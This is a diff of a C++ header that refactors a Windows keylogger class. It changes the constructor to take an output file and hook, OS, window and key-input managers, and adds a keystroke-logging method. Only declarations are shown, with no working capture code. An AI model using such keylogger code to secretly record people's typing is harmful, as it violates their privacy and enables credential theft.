@@ -1,35 +1,29 @@
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
 
-#include <os_manager.h>
-#include <hook_manager.h>
 #include <Windows.h>
 #include <sstream>
-#include <fstream>
-#include <map>
 
-enum LoggingFormat
-{
-    Default,
-    Decimal,
-    Hexadecimal
-};
+#include "windows_info.h"
+#include "hook_manager.h"
+#include "os_manager.h"
+#include "key_input.h"
 
 class Keylogger {
 public:
-    Keylogger(OSManager& manager, HookManager& hookManager);
-
-    void Listen();
+    Keylogger(std::ofstream&& outputFile, OSManager& manager, HookManager& hookManager, WindowInfo& windowInfo, KeyInput& keyInput);
+    
+    int LogKeyStroke(int keyStroke);
 
 private:
-    std::map<int, std::string> _VIRTUAL_KEY_NAME;
-    const LoggingFormat _LOGGING_FORMAT;
-    const bool _MOUSE_IGNORE;
-    
-    HookManager _hookManager;
-    OSManager _manager;
+    OSManager& _manager;
+    HookManager& _hookManager;
+    WindowInfo& _windowInfo;
+    KeyInput& _keyInput;
 
-    int save(int keyStroke); 
+    std::ofstream _outputFile;
+
+    void writeToOutput(std::stringstream& output);
 };
 
 #endif
